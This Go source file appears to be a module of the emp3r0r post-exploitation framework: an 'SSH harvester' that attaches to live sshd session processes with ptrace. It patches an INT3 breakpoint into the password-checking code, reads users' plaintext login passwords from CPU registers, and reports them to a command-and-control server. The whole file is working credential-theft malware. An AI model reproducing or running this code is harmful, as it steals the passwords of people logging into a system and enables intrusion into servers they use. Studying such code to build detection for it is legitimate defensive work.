//go:build linux && amd64
// +build linux,amd64

package modules

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
	"golang.org/x/sys/unix"
)

var (
	// mark ssh harvester as running
	SshHarvesterRunning bool

	// record traced sshd sessions
	traced_pids     = make(map[int]bool)
	traced_pids_mut = &sync.RWMutex{}

	// provide a way to stop the harvester
	SshHarvesterCtx    context.Context
	SshHarvesterCancel context.CancelFunc
)

func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err error) {
	if SshHarvesterRunning {
		c2transport.NotifyC2(cmd, "SSH Harvester already running")
		return
	} else {
		// initialize context
		SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
	}
	defer func() {
		c2transport.NotifyC2(cmd, "SSH Harvester (%d) terminated", unix.Getpid())
		SshHarvesterRunning = false // mark as finished
	}()

	alive, sshd_procs := util.IsProcAlive("sshd")
	if !alive {
		c2transport.NotifyC2(cmd, "SSH Harvester (%d): sshd service process not found, aborting", unix.Getpid())
		return
	}

	c2transport.NotifyC2(cmd, "SSH harvester started (%d) with code pattern set to 0x%x", unix.Getpid(), code_pattern)
	SshHarvesterRunning = true // mark as running
	monitor := func(sshd_pid int) {
		c2transport.NotifyC2(cmd, "Started monitor (%d) on SSHD session process (%d), looking for code pattern 0x%x", unix.Getpid(), sshd_pid, code_pattern)
		defer c2transport.NotifyC2(cmd, "Monitor for %d done", sshd_pid)
		for SshHarvesterCtx.Err() == nil {
			util.TakeABlink()
			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
			children_data, err := os.ReadFile(children_file)
			if err != nil {
				return
			}
			children_pids := strings.Fields(string(children_data))
			for _, child := range children_pids {
				child_pid, err := strconv.Atoi(child)
				if err == nil {
					traced_pids_mut.RLock()
					if !traced_pids[child_pid] {
						go sshd_harvester(child_pid, cmd, code_pattern, reg_name)
					}
					traced_pids_mut.RUnlock()
				}
			}
		}
	}
	for _, sshd_proc := range sshd_procs {
		if SshHarvesterCtx.Err() == nil {
			go monitor(int(sshd_proc.Pid))
		}
	}

	for SshHarvesterCtx.Err() == nil {
		util.TakeABlink()
	}

	return
}

func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name string) {
	defer c2transport.NotifyC2(cmd, "SSH harvester for sshd session %d done", pid)

	// remember pid
	traced_pids_mut.Lock()
	traced_pids[pid] = true
	traced_pids_mut.Unlock()

	// passwords
	passwords := make([]string, 1)

	if code_pattern == nil {
		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
	}
	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
	c2transport.NotifyC2(cmd, "\n[+] Starting Harvester for SSHD session %d", pid)
	map_file := fmt.Sprintf("/proc/%d/maps", pid)
	map_data, err := os.ReadFile(map_file)
	if err != nil {
		c2transport.NotifyC2(cmd, "Failed to read memory map of %d: %v", pid, err)
		return
	}
	// parse memory map
	lines := strings.Split(string(map_data), "\n")
	var (
		ptr  uint64 // start of sshd process, start of code pattern
		pend uint64 // end of sshd process
	)
	for _, line := range lines {
		if strings.Contains(line, "/sshd") &&
			strings.Contains(line, "r-x") {
			f1 := strings.Fields(line)[0]
			if len(f1) < 2 {
				c2transport.NotifyC2(cmd, "error parsing line: %s", line)
				continue
			}
			start := strings.Split(f1, "-")[0]
			end := strings.Split(f1, "-")[1]
			ptr, err = strconv.ParseUint(start, 16, 64)
			if err != nil {
				c2transport.NotifyC2(cmd, "parsing pstart: %v", err)
				return
			}
			pend, err = strconv.ParseUint(end, 16, 64)
			if err != nil {
				c2transport.NotifyC2(cmd, "parsing pend: %v", err)
				return
			}
		}
	}
	c2transport.NotifyC2(cmd, "Harvester PID is %d", unix.Getpid())
	c2transport.NotifyC2(cmd, "SSHD process found in 0x%x - 0x%x", ptr, pend)
	pstart := ptr

	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
	// fixes "no such process" error
	// this makes sure we don't lose our tracee
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err = unix.PtraceAttach(pid)
	if err != nil {
		c2transport.NotifyC2(cmd, "failed to attach to %d: %v", pid, err)
		return
	}
	defer unix.PtraceDetach(pid)
	// wait for the process to stop
	wstatus := new(unix.WaitStatus)
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		c2transport.NotifyC2(cmd, "wait %d: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		c2transport.NotifyC2(cmd, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		c2transport.NotifyC2(cmd, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		c2transport.NotifyC2(cmd, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		c2transport.NotifyC2(cmd, "SSHD %d has stopped on attach...", pid)
	}
	word := make([]byte, 8)
	c2transport.NotifyC2(cmd, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)

	// search for auth_password
	c2transport.NotifyC2(cmd, "Searching for auth_password")
	for ptr < pend {
		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
		if err != nil {
			c2transport.NotifyC2(cmd, "PTRACE_PEEKTEXT searching memory of %d: %v",
				pid, err)
			time.Sleep(time.Second)
		}
		if bytes.Equal(word, code_pattern) {
			c2transport.NotifyC2(cmd, "Got a hit (0x%x) at 0x%x", word, ptr)
			// now pstart is the start of our code pattern
			break
		}
		ptr++
	}
	if ptr == pend {
		c2transport.NotifyC2(cmd, "code pattern 0x%x not found in memory 0x%x to 0x%x",
			code_pattern, pstart, pend)
		return
	}

	// points to the start of our code pattern
	pcode_pattern := uintptr(ptr)
	// dump code at code pattern
	c2transport.NotifyC2(cmd, "Code pattern found at 0x%x", pcode_pattern)
	dump_code(pid, pcode_pattern, cmd)

	// before breakpoint, what does the code look like
	c2transport.NotifyC2(cmd, "Before setting the breakpoint, what does the code look like?")
	regs := dump_regs(pid, cmd)
	if regs != nil {
		dump_code(pid, uintptr(regs.Rip), cmd)
	}

	// write breakpoint
	code_with_trap := make([]byte, 8)
	copy(code_with_trap, code_pattern)
	code_with_trap[0] = 0xCC
	// code_with_trap[len(code_with_trap)-1] = 0xCC
	c2transport.NotifyC2(cmd, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		c2transport.NotifyC2(cmd, "patching code: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "INT3 written, breakpoint set")
	c2transport.NotifyC2(cmd, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
	dump_code(pid, pcode_pattern, cmd)
	c2transport.NotifyC2(cmd, "Resuming process to let it hit breakpoint")
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		c2transport.NotifyC2(cmd, "resuming process: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		c2transport.NotifyC2(cmd, "wait %d to hit breakpoint: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		c2transport.NotifyC2(cmd, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		c2transport.NotifyC2(cmd, "SSHD %d core dumped...", pid)
		return
	case wstatus.Continued():
		c2transport.NotifyC2(cmd, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		c2transport.NotifyC2(cmd, "SSHD %d has hit breakpoint", pid)
	}

handler:
	success := false
	// read registers on break
	regs = new(unix.PtraceRegs)
	err = unix.PtraceGetRegs(pid, regs)
	if err != nil {
		c2transport.NotifyC2(cmd, "get regs: %v", err)
		return
	}
	pam_ret := regs.Rax
	// where are we at
	c2transport.NotifyC2(cmd, "Dumping code at RIP after hitting breakpoint")
	dump_code(pid, uintptr(regs.Rip), cmd)

	// read password from given register name
	password_bytes := read_reg_val(pid, reg_name, cmd)
	c2transport.NotifyC2(cmd, "Extracting password from %s", reg_name)
	password := string(password_bytes)
	if pam_ret == 0 {
		c2transport.NotifyC2(cmd, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
	} else {
		success = true
		c2transport.NotifyC2(cmd, "\n\nWe have password 0x%x (%s)\n\n", password, password)
	}
	if password != "" {
		success = true
		passwords = append(passwords, password)
	}
	// remove breakpoint
	c2transport.NotifyC2(cmd, "Removing breakpoint")
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
	if err != nil {
		c2transport.NotifyC2(cmd, "restoring code to remove breakpoint: %v", err)
		return
	}
	// one byte back, go back before 0xCC, at the start of code pattern
	regs.Rip--
	c2transport.NotifyC2(cmd, "Setting RIP back one byte to 0x%x", regs.Rip)
	err = unix.PtraceSetRegs(pid, regs)
	if err != nil {
		c2transport.NotifyC2(cmd, "set regs back: %v", err)
		return
	}
	dump_code(pid, uintptr(regs.Rip), cmd)

	// single step to execute original code
	err = unix.PtraceSingleStep(pid)
	if err != nil {
		c2transport.NotifyC2(cmd, "single step: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		c2transport.NotifyC2(cmd, "wait %d to single step: %v", pid, err)
		return
	}
	c2transport.NotifyC2(cmd, "Single step done")

	// check if breakpoint is removed
	c2transport.NotifyC2(cmd, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
	dump_code(pid, pcode_pattern, cmd)
	c2transport.NotifyC2(cmd, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)

	// add breakpoint back
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		c2transport.NotifyC2(cmd, "patching code: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "Added breakpoint back")

	// continue sshd session process
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		c2transport.NotifyC2(cmd, "continue SSHD session: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		c2transport.NotifyC2(cmd, "wait %d to continue: %v", pid, err)
		return
	}
	switch {
	case wstatus.Stopped():
		if !success {
			c2transport.NotifyC2(cmd, "SSHD %d stopped, but no password found, let's keep the bp and try again", pid)
			goto handler
		}
	case wstatus.Exited():
		c2transport.NotifyC2(cmd, "SSHD %d exited...", pid)
	case wstatus.CoreDump():
		c2transport.NotifyC2(cmd, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		c2transport.NotifyC2(cmd, "SSHD %d core continues...", pid)
	default:
		c2transport.NotifyC2(cmd, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
	}

	res := make([]string, 1)
	for _, p := range passwords {
		if p != "" && util.AreBytesPrintable([]byte(p)) {
			res = append(res, strconv.Quote(p))
		}
	}

	c2transport.NotifyC2(cmd, "SSHD session %d done, passwords are %s", pid, res)
}

// dump registers' values and the registers themselves
func dump_regs(pid int, cmd *cobra.Command) (regs *unix.PtraceRegs) {
	regs = new(unix.PtraceRegs)
	err := unix.PtraceGetRegs(pid, regs)
	if err != nil {
		c2transport.NotifyC2(cmd, "dump code for %d failed: %v", pid, err)
		return
	}

	// dump reg values
	rax := read_reg_val(pid, "RAX", cmd)
	rdi := read_reg_val(pid, "RDI", cmd)
	rsi := read_reg_val(pid, "RSI", cmd)
	rdx := read_reg_val(pid, "RDX", cmd)
	rcx := read_reg_val(pid, "RCX", cmd)
	r8 := read_reg_val(pid, "R8", cmd)
	r9 := read_reg_val(pid, "R9", cmd)
	rbp := read_reg_val(pid, "RBP", cmd)
	rsp := read_reg_val(pid, "RSP", cmd)
	c2transport.NotifyC2(cmd, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)

	return
}

// read register value, return printable text or hex string
func read_reg_val(pid int, reg_name string, cmd *cobra.Command) (val []byte) {
	regs := new(unix.PtraceRegs)
	err := unix.PtraceGetRegs(pid, regs)
	if err != nil {
		c2transport.NotifyC2(cmd, "dump code for %d failed: %v", pid, err)
		return
	}
	switch reg_name {
	case "RAX":
		val = peek_text(pid, uintptr(regs.Rax), cmd, true)
	case "RDI":
		val = peek_text(pid, uintptr(regs.Rdi), cmd, true)
	case "RSI":
		val = peek_text(pid, uintptr(regs.Rsi), cmd, true)
	case "RDX":
		val = peek_text(pid, uintptr(regs.Rdx), cmd, true)
	case "RCX":
		val = peek_text(pid, uintptr(regs.Rcx), cmd, true)
	case "R8":
		val = peek_text(pid, uintptr(regs.R8), cmd, true)
	case "R9":
		val = peek_text(pid, uintptr(regs.R9), cmd, true)
	case "RBP":
		val = peek_text(pid, uintptr(regs.Rbp), cmd, true)
	case "RSP":
		val = peek_text(pid, uintptr(regs.Rsp), cmd, true)
	}
	return
}

// read memory at addr and check if it's printable, 24 bytes at most
func peek_text(pid int, addr uintptr, cmd *cobra.Command, ensure_printable bool) (read_bytes []byte) {
	if addr == 0 {
		c2transport.NotifyC2(cmd, "Invalid address 0x%x", addr)
		return
	}
	read_bytes = make([]byte, 24)
	_, err := unix.PtracePeekText(pid, addr, read_bytes)
	if err != nil {
		c2transport.NotifyC2(cmd, "PEEKTEXT: %v", err)
		return
	}
	if !ensure_printable {
		return
	}
	if util.AreBytesPrintable(read_bytes) {
		// we only want the string, remove everything after the first null byte
		return bytes.Split(read_bytes, []byte{0})[0]
	}
	res_str := hex.EncodeToString(read_bytes)
	return []byte(res_str)
}

func dump_code(pid int, addr uintptr, cmd *cobra.Command) {
	code_bytes := peek_text(pid, addr, cmd, false)
	if len(code_bytes) == 0 {
		return
	}
	c2transport.NotifyC2(cmd, "Code at 0x%x: %x", addr, code_bytes)
}

func get_tracer_pid(pid int, cmd *cobra.Command) (tracer_pid int) {
	// check tracer pid
	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		c2transport.NotifyC2(cmd, "get_tracer: %v", err)
		return
	}
	lines := strings.Split(string(proc_status), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			tracer := strings.Fields(line)[1]
			tracer_pid, err = strconv.Atoi(tracer)
			if err != nil {
				c2transport.NotifyC2(cmd, "Invalid tracer PID: %v", err)
				return
			}
			break
		}
	}

	return
}
